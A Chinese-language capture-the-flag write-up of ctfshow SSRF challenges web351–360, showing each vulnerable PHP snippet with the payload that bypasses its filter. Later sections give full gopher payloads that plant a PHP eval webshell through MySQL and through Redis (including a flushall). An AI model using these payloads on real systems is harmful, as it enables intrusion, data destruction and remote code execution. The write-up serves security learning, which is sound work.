## 写在前面

转眼就22年了，忙里偷闲，来学习一下SSRF

——KonDream 2022-1-13 1:40

***

SSRF全称是Server-Side Request Forgery:服务器端请求伪造，目的是伪造服务器请求去访问无法从外网访问的内网系统

***

## web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
```

第一题没什么过滤，说明一下第6和第7行

| **CURLOPT_HEADER**         | 启用时会将头文件的信息作为数据流输出。                       |
| -------------------------- | ------------------------------------------------------------ |
| **CURLOPT_RETURNTRANSFER** | **true将[curl_exec()](https://www.php.net/manual/zh/function.curl-exec.php)获取的信息以字符串返回，而不是直接输出。** |

第8行执行给定的curl会话，执行成功时返回结果

`payload：url=http://127.0.0.1/flag.php`

## web352

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

第7行对post参数进行了过滤，但是有个小问题，就是他的过滤没有转义

`payload：url=http://127.0.0.1/flag.php`

## web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

用127.1等绕过就行

`payload：url=http://127.1.0.1/flag.php`

## web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

这个题有点怪，参考了其他师傅的wp，思路大概是在自己的vps上做个302跳转到127.0.0.1/flag.php上，这个payload是羽师傅还是Y4师傅的了记不清了，总之谢谢师傅们提供的payload

`payload：url=http://sudo.cc/flag.php`

## web355

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

限制域名长度不超过5，可以用127.*（0除外）

`payload：url=http://127.1/flag.php`

## web356

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=3)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

**小知识点，0在linux下会被解析成127.0.0.1，而在win中被解析成0.0.0.0.**

`payload：url=http://0/flag.php`

## web357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}

echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?> scheme
```

看第9行的过滤器，FILTER_VALIDATE_IP 过滤器把值作为 IP 进行验证。

可能的标志：

- FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
- FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
- FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
- FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

**返回值是过滤后的数据，如果过滤失败则返回FALSE**

第一种解法是在自己的vps上写个test.php

```php
<?php
header("Location:http://127.0.0.1/flag.php"); 
```

`payload：url=http://xxx/test.php`

第二种解法是利用dns重绑定漏洞，**大佬文章：https://zhuanlan.zhihu.com/p/89426041**

![image-20220113025537987](image/ctfshow-SSRF(351-360)/image-20220113025537987.png)

在ceye上进行dns重绑定

`payload：url=http://r.xxx/flag.php`

## web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

以ctf.开头，以show结尾，同时保证host为本地地址	

`payload：url=http://ctf.@127.0.0.1/flag.php?show`

## web359

hint说打无密码的mysql，那么考虑万能协议Gopher

>
>gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议。
>
>Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。
>
>gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&分隔符也要进行url编码。

利用点returl：

![image-20220113132558446](image/ctfshow-SSRF(351-360)/image-20220113132558446.png)

![image-20220113132608477](image/ctfshow-SSRF(351-360)/image-20220113132608477.png)

工具利用地址：https://github.com/tarunkant/Gopherus

![image-20220113132205604](image/ctfshow-SSRF(351-360)/image-20220113132205604.png)

指定用户名和命令，这里写个马进去，注意不是所有情况下都可以写马，当前用户必须存在file权限，以及导出到`--secure-file-priv`指定目录下，并且导入目录需要有写权限。因为我这里post时会进行一次url解码，所以将结果再进行一次urlencode

`payload：returl=gopher%3A%2F%2F127.0.0.1%3A3306%2F_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2542%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%253d%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2522%2501%2500%2500%2500%2501&u=123`

执行成功后即可getshell

![image-20220113132935491](image/ctfshow-SSRF(351-360)/image-20220113132935491.png)

## web360

用 SSRF 打 redis，工具同上![image-20220113134100273](image/ctfshow-SSRF(351-360)/image-20220113134100273.png)

`payload：url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252425%250D%250A%250A%250A%253C%253F%253Deval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A`

![image-20220113134148341](image/ctfshow-SSRF(351-360)/image-20220113134148341.png)

## 写在最后

SSRF到此结束了，仍需多加练习才能更深入掌握

——KonDream 2022年1月13日13:43:14
